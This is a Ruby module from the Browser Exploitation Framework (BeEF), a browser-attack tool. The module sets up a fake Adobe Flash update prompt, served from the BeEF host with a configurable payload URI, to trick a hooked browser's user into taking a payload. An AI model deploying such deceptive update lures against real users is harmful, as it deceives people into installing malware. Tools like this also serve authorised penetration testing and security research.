#
# Copyright (c) 2006-2023 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
class Fake_flash_update < BeEF::Core::Command
  def pre_send
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/fake_flash_update/img/eng.png', '/adobe/flash_update', 'png')
  end

  def self.options
    @configuration = BeEF::Core::Configuration.instance
    proto = @configuration.beef_proto
    beef_host = @configuration.beef_host
    beef_port = @configuration.beef_port
    base_host = "#{proto}://#{beef_host}:#{beef_port}"

    image = "#{base_host}/adobe/flash_update.png"

    [
      { 'name' => 'image', 'description' => 'Location of image for the update prompt', 'ui_label' => 'Image', 'value' => image },
      { 'name' => 'payload_uri', 'description' => 'Payload URI', 'ui_label' => 'Payload URI', 'value' => '' }
    ]
  end

  def post_execute
    content = {}
    content['result'] = @datastore['result']
    save content

    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/adobe/flash_update.png')
  end
end
